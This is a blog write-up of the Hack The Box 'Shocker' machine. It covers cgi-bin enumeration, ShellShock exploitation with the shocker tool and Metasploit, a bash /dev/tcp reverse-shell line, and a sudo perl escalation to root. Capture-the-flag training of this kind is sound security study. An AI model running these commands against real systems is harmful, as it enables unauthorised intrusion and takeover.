---
layout: post
title: "Shocker"
date: 2020-09-21 22:00:00 -0600
categories: HTB OSCP
tags: HTB Shocker Linux ShellShock
---

Shocker is an easy level box on Hack The Box.

## Enumeration

![site](/assets/images/shocker/site.png)

Same as every machine we are going to start with our autorecon scan. This revealed only 2 open ports, port 80 and port 2222. Nikto and GoBuster didn't show much on their scans other than a `cgi-bin` folder so I decided to throw dirbuster at it with php and sh for extensions to see if there are scripts buried there.

![dibuster](/assets/images/shocker/dirbuster.png)

This returned a `user.sh` script in the cgi-bin folder, not having much to go on and knowing that machine names are sometimes a hint for machines I decided to poke at this script and an older vulnerability know as [ShellShock](<https://en.wikipedia.org/wiki/Shellshock_(software_bug)>). This took advantage of advantage of a bug in bash to execute arbitrary commands. In my digging I found a tool for finding ShellShock exploitable scripts with the name [shocker](https://github.com/nccgroup/shocker). I was able to use this to exploit our machine with the following command `python shocker.py -H 10.10.10.56 --command /bin/ls -c /cgi-bin/user.sh`

![shocker](/assets/images/shocker/shocker.png)

Now that we have command execution on the machine we can try to pop a shell. [Pentest Monkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) has my favorite reverse shell cheat sheet. I decided to go the simple route and try a basic bash reverse shell, we can attempt to get a shell with `/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1` This ended up getting us our shell as the user Shelly

## Elevate

Now that we have a shell I generally default to a `sudo -l` as my first enumeration step and in this case we found some really low hanging fruit for escalation. We can see this user can sudo perl without a password.

![sudo](/assets/images/shocker/user.png)

Referencing [GTFOBINS](https://gtfobins.github.io/) we can see a fairly simple perl command to get a shell `sudo perl -e 'exec "/bin/sh";'`. Running this gives us our root shell and we can grab our flags and get out.

![got root?](/assets/images/shocker/got_root.png)

## Metasploit

I wanted to try to a metasploit module for this one to see if I could get it to work the "easy" way as well. We can start off by searching for a metasploit module for shellshock. There is a auxiliary module for scanning so I decided to give that a go first, start off by doing a `use auxiliary/scanner/http/apache_mod_cgi_bash_env`. We need to set the RHOSTS and TARGETURI values here.

![scanner](/assets/images/shocker/aux.png)

We want to use `exploit/multi/http/apache_mod_cgi_bash_env_exec`. For this to work we need to set basically the same payloads as before, RHOSTS and TARGETURI. Also make sure you have the right LHOST set, it usually defaults to your primary adapter. You can set it to your VPN tunnel with `set LHOST tun0`. Once we have our options set we can fire off the exploit and catch our shell.

![meterpreter](/assets/images/shocker/got_root_ms.png)
